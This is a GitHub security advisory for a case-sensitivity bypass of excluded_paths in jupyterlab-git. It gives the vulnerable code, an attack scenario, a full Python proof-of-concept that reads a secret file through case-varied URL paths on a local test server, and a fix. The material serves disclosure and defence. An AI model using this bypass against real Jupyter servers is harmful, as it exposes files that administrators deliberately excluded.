# [H] jupyterlab-git excluded_paths Case-Sensitivity Bypass Allows Reading Excluded Directories

## Summary
Severity: High
Advisory: GHSA-436q-jwfr-rm2h
CVE: CVE-2026-54528
CWE: CWE-178
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-436q-jwfr-rm2h
Type: github-advisory

## Affected
- PyPI: `jupyterlab-git` — affected >=0 <0.54.0

## Details
## Summary

`jupyterlab-git` 0.53.0 (latest, 2026-04-30) uses `fnmatch.fnmatchcase()` in `GitHandler.prepare()` (`jupyterlab_git/handlers.py:91`) to enforce the admin-configured `excluded_paths` security control. Because `fnmatchcase` is unconditionally case-sensitive, an authenticated user on a case-insensitive filesystem (macOS APFS, Windows NTFS) can bypass the exclusion by varying the case of the URL path segment — e.g. requesting `/git/project/Secrets/...` instead of `/git/project/secrets/...` — gaining read access to git history, file content, and status in directories the administrator explicitly excluded.

## Vulnerable Code

```python
# jupyterlab_git/handlers.py:84-92
async def prepare(self):
    """Check if the path should be skipped"""
    await ensure_async(super().prepare())
    path = self.path_kwargs.get("path")
    if path is not None:
        excluded_paths = self.git.excluded_paths
        for excluded_path in excluded_paths:
            if fnmatch.fnmatchcase(path, excluded_path):  # ← always case-sensitive
                raise tornado.web.HTTPError(404)
```

## Root Cause

`fnmatch.fnmatchcase()` is unconditionally case-sensitive regardless of the operating system. Contrast with `fnmatch.fnmatch()` which normalizes via `os.path.normcase()` on case-insensitive platforms.

```python
fnmatch.fnmatchcase("/project/secrets", "/project/secrets")  # True  — blocked
fnmatch.fnmatchcase("/project/Secrets", "/project/secrets")  # False — bypasses check
```

On macOS APFS and Windows NTFS, `/project/Secrets` and `/project/secrets` resolve to the same directory on disk. The exclusion check rejects only the exact-case match, but the downstream `url2localpath()` resolves the case-varied path to the same filesystem location.

## Impact

An authenticated JupyterLab user with access to the affected Jupyter server can bypass admin-configured `excluded_paths` by varying the case of the URL path segment. This grants:

- Read file content at any git ref (`/content` endpoint)
- Read working tree files in the excluded directory
- View git status, log, diff on the excluded path
- Enumerate commits touching excluded files

## Attack Scenario

1. Admin configures `c.JupyterLabGit.excluded_paths = ["/project/secrets", "/project/secrets/*"]`
2. Normal request `POST /git/project/secrets/status` → HTTP 404 (blocked)
3. Attacker requests `POST /git/project/Secrets/status` → HTTP 200 (bypass)
4. Attacker reads secret: `POST /git/project/Secrets/content` with `{"filename": "./cred.txt", "reference": {"git": "HEAD"}}` → file content returned

## Exploit

See `poc.py`. Starts a real jupyter-server with jupyterlab-git loaded, configures `excluded_paths`, and demonstrates bypass + exfiltration via HTTP.
```python
import json, os, shutil, subprocess, sys, tempfile, time
import urllib.request, urllib.error

from jupyterlab_git.handlers import GitHandler  # real import, no mock
from jupyterlab_git_core.git import Git
import jupyterlab_git_core

PORT = 18895
TOKEN = "xtoken"
BASE_URL = f"http://127.0.0.1:{PORT}"
SECRET = "sk-PROD-a8f2x9q-LIVE-KEY"


def post(path_seg, endpoint, body=None):
    url = f"{BASE_URL}/git/{path_seg}{endpoint}"
    data = json.dumps(body or {}).encode()
    req = urllib.request.Request(url, data=data, method="POST",
        headers={"Authorization": f"token {TOKEN}", "Content-Type": "application/json"})
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def main():
    base_dir = tempfile.mkdtemp(prefix="jlgit_")
    workspace = os.path.join(base_dir, "workspace")
    repo_dir = os.path.join(workspace, "project")
    secret_dir = os.path.join(repo_dir, "secrets")
    os.makedirs(secret_dir)

    with open(os.path.join(secret_dir, "cred.txt"), "w") as f:
        f.write(SECRET + "\n")

    git_env = {**os.environ, "GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@x",
               "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@x"}
    subprocess.run(["git", "init"], cwd=repo_dir, capture_output=True, check=True)
    subprocess.run(["git", "add", "."], cwd=repo_dir, capture_output=True, check=True)
    subprocess.run(["git", "commit", "-m", "init"], cwd=repo_dir,
                   capture_output=True, check=True, env=git_env)

    config_path = os.path.join(base_dir, "jupyter_server_config.py")
    with open(config_path, "w") as f:
        f.write(f'c.ServerApp.root_dir = "{workspace}"\n')
        f.write(f'c.ServerApp.token = "{TOKEN}"\n')
        f.write(f'c.ServerApp.open_browser = False\n')
        f.write(f'c.ServerApp.port = {PORT}\n')
        f.write(f'c.ServerApp.ip = "127.0.0.1"\n')
        f.write(f'c.ServerApp.disable_check_xsrf = True\n')
        f.write(f'c.JupyterLabGit.excluded_paths = ["/project/secrets", "/project/secrets/*"]\n')

    env = os.environ.copy()
    env["JUPYTER_CONFIG_DIR"] = base_dir
    env["JUPYTER_DATA_DIR"] = base_dir
    proc = subprocess.Popen(
        [sys.executable, "-m", "jupyter_server", f"--config={config_path}",
         "--ServerApp.jpserver_extensions={'jupyterlab_git': True}"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env, cwd=base_dir)

    for _ in range(30):
        try:
            req = urllib.request.Request(f"{BASE_URL}/api/status",
                                         headers={"Authorization": f"token {TOKEN}"})
            if urllib.request.urlopen(req, timeout=2).status == 200:
                break
        except (urllib.error.URLError, OSError):
            pass
        time.sleep(0.5)
    else:
        proc.kill()
        shutil.rmtree(base_dir, ignore_errors=True)
        sys.exit("server failed to start")

    try:
        # exclusion works
        code, _ = post("project/secrets", "/status")
        blocked = code == 404

        # bypass
        code, _ = post("project/Secrets", "/status")
        bypassed = code == 200

        # exfiltrate
        code, body = post("project/Secrets", "/content",
                          {"filename": "./cred.txt", "reference": {"git": "HEAD"}})
        content = body.get("content", "") if isinstance(body, dict) else ""
        exfiltrated = SECRET in content

        ok = blocked and bypassed and exfiltrated
        print(f"exclusion enforced (lowercase): {blocked}")
        print(f"bypass (case-varied):           {bypassed}")
        print(f"secret exfiltrated:             {exfiltrated}")
        print(f"result:                         {'VULNERABLE' if ok else 'NOT CONFIRMED'}")
        return ok

    finally:
        proc.terminate()
        proc.wait(timeout=5)
        shutil.rmtree(base_dir, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(0 if main() else 1)

```

```bash
pip install 'jupyterlab-git==0.53.0'
python poc.py
```
<img width="686" height="146" alt="image" src="https://github.com/user-attachments/assets/f5b8d349-539a-44d7-9b17-d13b5f802625" />


## Fix

```python
if fnmatch.fnmatch(path.lower(), excluded_path.lower()):
    raise tornado.web.HTTPError(404)
```

Or apply `os.path.normcase()` to both operands before comparison.

## References
- https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-436q-jwfr-rm2h
- https://github.com/jupyterlab/jupyterlab-git
